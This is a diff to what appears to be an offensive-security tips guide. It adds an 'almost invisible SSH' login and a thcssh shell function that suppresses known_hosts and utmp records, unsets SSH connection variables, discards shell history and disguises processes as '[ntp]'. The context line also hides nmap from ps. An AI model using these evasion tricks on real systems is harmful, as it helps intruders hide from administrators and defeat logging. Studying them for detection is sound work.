@@ -236,10 +236,30 @@ ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prn
 ## 2. SSH
 <a id="ssh-invisible"></a>
 **2.i. Almost invisible SSH**
+
+Stops you from showing up in *w* or *who* command and stops logging the host to *~/.ssh/known_hosts*.
 ```sh
 ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
 ```
-This will not add your user to the */var/log/utmp* file and you won't show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.
+
+Go full comfort with `thcssh user@server.org`:
+
+```sh
+### Cut & Paste the following to your shell, then execute
+### thcssh user@server.org
+thcssh()
+{
+    local ttyp
+    echo -e "\e[0;35mTHC says: pimp up your prompt: Cut & Paste the following into your remote shell:\e[0;36m"
+    echo -e 'PS1="{THC} \[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]# "\e[0m'
+    ttyp=$(stty -g)
+    stty raw -echo opost
+    ssh -q -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=accept-new -T \
+        "$@" \
+        "unset SSH_CLIENT SSH_CONNECTION; TERM=xterm-256color BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'exec -a [uid] /bin/bash -i' /dev/null"
+    stty "${ttyp}"
+}
+```
 
 <a id="ssh-tunnel"></a>
 **2.ii SSH tunnel**
